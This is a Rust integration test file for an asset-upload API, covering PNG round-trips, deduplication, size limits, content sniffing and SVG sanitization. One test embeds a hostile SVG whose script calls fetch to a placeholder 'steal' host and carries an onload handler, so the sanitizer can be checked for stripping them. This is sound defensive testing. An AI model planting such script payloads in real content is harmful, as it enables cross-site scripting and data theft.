//! Asset upload over HTTP (plan sections 44, 45 and 73).

use std::sync::Arc;

use actix_web::{
    dev::ServiceResponse,
    http::StatusCode,
    test::{self, TestRequest},
    web, App,
};
use forma_server::{routes, state::AppState};
use renderer::FontRegistry;
use serde_json::{json, Value};

const BOUNDARY: &str = "forma-test-boundary";

async fn state() -> (AppState, tempfile::TempDir) {
    let dir = tempfile::tempdir().expect("temp dir");
    let pool = persistence::connect(
        &format!("sqlite://{}", dir.path().join("forma.db").display()),
        dir.path(),
    )
    .await
    .expect("migrations");

    let font_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/../../data/fonts");
    let fonts = Arc::new(FontRegistry::from_dir(font_dir).expect("fonts"));
    let cache = Arc::new(renderer::RenderCache::new(dir.path().join("previews")));
    let store = Arc::new(persistence::LocalObjectStore::new(dir.path()));

    (AppState::new(pool, fonts, cache, store), dir)
}

macro_rules! app {
    ($state:expr) => {
        test::init_service(
            App::new()
                .app_data(web::Data::new($state))
                .configure(routes::configure),
        )
        .await
    };
}

async fn body_json(response: ServiceResponse) -> Value {
    serde_json::from_slice(&test::read_body(response).await).expect("JSON")
}

/// Wraps bytes as a one-field multipart body, the way a browser form would.
fn multipart(filename: &str, bytes: &[u8]) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(format!("--{BOUNDARY}\r\n").as_bytes());
    body.extend_from_slice(
        format!("Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n\r\n")
            .as_bytes(),
    );
    body.extend_from_slice(bytes);
    body.extend_from_slice(format!("\r\n--{BOUNDARY}--\r\n").as_bytes());
    body
}

fn upload_request(project: &str, filename: &str, bytes: &[u8]) -> actix_http::Request {
    TestRequest::post()
        .uri(&format!("/api/v1/projects/{project}/assets"))
        .insert_header((
            "content-type",
            format!("multipart/form-data; boundary={BOUNDARY}"),
        ))
        .set_payload(multipart(filename, bytes))
        .to_request()
}

/// A real 2x2 PNG, so the bytes survive an actual decoder rather than only a
/// header check.
fn png() -> Vec<u8> {
    let mut pixmap = resvg::tiny_skia::Pixmap::new(2, 2).unwrap();
    pixmap.fill(resvg::tiny_skia::Color::from_rgba8(0xFF, 0x5A, 0x36, 0xFF));
    pixmap.encode_png().unwrap()
}

async fn a_project(
    app: &impl actix_web::dev::Service<
        actix_http::Request,
        Response = ServiceResponse,
        Error = actix_web::Error,
    >,
) -> String {
    let response = test::call_service(
        app,
        TestRequest::post()
            .uri("/api/v1/projects")
            .set_json(json!({ "name": "Uploads" }))
            .to_request(),
    )
    .await;
    body_json(response).await["id"]
        .as_str()
        .unwrap()
        .to_string()
}

#[actix_web::test]
async fn a_png_uploads_and_comes_back_byte_for_byte() {
    let (state, _dir) = state().await;
    let app = app!(state);
    let project = a_project(&app).await;

    let bytes = png();
    let response = test::call_service(&app, upload_request(&project, "hero.png", &bytes)).await;
    assert_eq!(response.status(), StatusCode::CREATED);

    let asset = body_json(response).await;
    assert_eq!(asset["mime_type"], "image/png");
    assert_eq!(asset["kind"], "raster");
    assert_eq!(
        (asset["width"].as_u64(), asset["height"].as_u64()),
        (Some(2), Some(2))
    );
    assert_eq!(asset["origin"], "user_upload");
    assert_eq!(asset["original_filename"], "hero.png");

    // Sharded by hash, never by the name the caller sent.
    let key = asset["storage_key"].as_str().unwrap();
    let hash = asset["hash"].as_str().unwrap();
    assert_eq!(
        key,
        format!("assets/{}/{}/{hash}.png", &hash[0..2], &hash[2..4])
    );

    let id = asset["id"].as_str().unwrap();
    let response = test::call_service(
        &app,
        TestRequest::get()
            .uri(&format!("/api/v1/assets/{id}/content"))
            .to_request(),
    )
    .await;
    assert_eq!(response.status(), StatusCode::OK);
    assert_eq!(response.headers().get("content-type").unwrap(), "image/png");
    assert_eq!(test::read_body(response).await.to_vec(), bytes);
}

/// Plan section 73: the same bytes twice are one asset, not two.
#[actix_web::test]
async fn uploading_the_same_bytes_twice_reuses_the_first_asset() {
    let (state, _dir) = state().await;
    let app = app!(state);
    let project = a_project(&app).await;

    let bytes = png();
    let first = test::call_service(&app, upload_request(&project, "a.png", &bytes)).await;
    assert_eq!(first.status(), StatusCode::CREATED);
    let first = body_json(first).await;

    // A different filename, identical content.
    let second = test::call_service(&app, upload_request(&project, "b.png", &bytes)).await;
    // 200 rather than 201: nothing new was stored.
    assert_eq!(second.status(), StatusCode::OK);
    let second = body_json(second).await;

    assert_eq!(
        first["id"], second["id"],
        "the same bytes must be one asset"
    );

    let listed = body_json(
        test::call_service(
            &app,
            TestRequest::get()
                .uri(&format!("/api/v1/projects/{project}/assets"))
                .to_request(),
        )
        .await,
    )
    .await;
    assert_eq!(listed.as_array().unwrap().len(), 1);
}

/// Plan section 45: what is stored is the normalized picture, not the upload.
#[actix_web::test]
async fn a_hostile_svg_is_stored_without_its_script() {
    let (state, _dir) = state().await;
    let app = app!(state);
    let project = a_project(&app).await;

    let hostile = br##"<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
        <script>fetch('http://example.invalid/steal')</script>
        <rect width="64" height="64" onload="alert(1)" fill="#FF5A36"/>
    </svg>"##;

    let response = test::call_service(&app, upload_request(&project, "logo.svg", hostile)).await;
    assert_eq!(response.status(), StatusCode::CREATED);

    let asset = body_json(response).await;
    assert_eq!(asset["mime_type"], "image/svg+xml");
    assert_eq!(asset["kind"], "vector");
    assert_eq!(
        (asset["width"].as_u64(), asset["height"].as_u64()),
        (Some(64), Some(64))
    );

    let id = asset["id"].as_str().unwrap();
    let served = test::call_service(
        &app,
        TestRequest::get()
            .uri(&format!("/api/v1/assets/{id}/content"))
            .to_request(),
    )
    .await;
    let text = String::from_utf8(test::read_body(served).await.to_vec()).unwrap();

    for forbidden in ["script", "onload", "fetch", "example.invalid"] {
        assert!(
            !text.contains(forbidden),
            "{forbidden:?} survived sanitization: {text}"
        );
    }
}

#[actix_web::test]
async fn the_extension_does_not_decide_what_the_file_is() {
    let (state, _dir) = state().await;
    let app = app!(state);
    let project = a_project(&app).await;

    // Named .png, actually a PDF.
    let response = test::call_service(
        &app,
        upload_request(
            &project,
            "innocent.png",
            b"%PDF-1.7\n%\xE2\xE3\xCF\xD3 trailer",
        ),
    )
    .await;

    assert_eq!(response.status(), StatusCode::BAD_REQUEST);
    let body = body_json(response).await;
    assert_eq!(body["error"]["code"], "INVALID_ASSET");
    assert!(body["error"]["hint"].as_str().unwrap().contains("PNG"));
}

#[actix_web::test]
async fn an_upload_over_the_limit_is_refused_while_it_streams() {
    let (state, _dir) = state().await;
    let app = app!(state.with_max_upload_bytes(512));
    let project = a_project(&app).await;

    let response =
        test::call_service(&app, upload_request(&project, "big.png", &vec![0u8; 4096])).await;

    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(
        body_json(response).await["error"]["code"],
        "PAYLOAD_TOO_LARGE"
    );
}

#[actix_web::test]
async fn uploading_into_a_project_that_does_not_exist_is_a_404() {
    let (state, _dir) = state().await;
    let app = app!(state);

    let response = test::call_service(
        &app,
        upload_request(&uuid::Uuid::new_v4().to_string(), "a.png", &png()),
    )
    .await;

    assert_eq!(response.status(), StatusCode::NOT_FOUND);
    assert_eq!(
        body_json(response).await["error"]["code"],
        "PROJECT_NOT_FOUND"
    );
}

/// The row must carry a real creation time, whatever the caller passed.
#[actix_web::test]
async fn an_uploaded_asset_is_stamped_with_a_real_creation_time() {
    let (state, _dir) = state().await;
    let app = app!(state);
    let project = a_project(&app).await;

    let asset =
        body_json(test::call_service(&app, upload_request(&project, "a.png", &png())).await).await;

    let created = asset["created_at"].as_str().expect("a created_at");
    assert!(
        created.len() >= 20 && created.ends_with('Z'),
        "expected an ISO 8601 UTC timestamp, got {created:?}"
    );
}
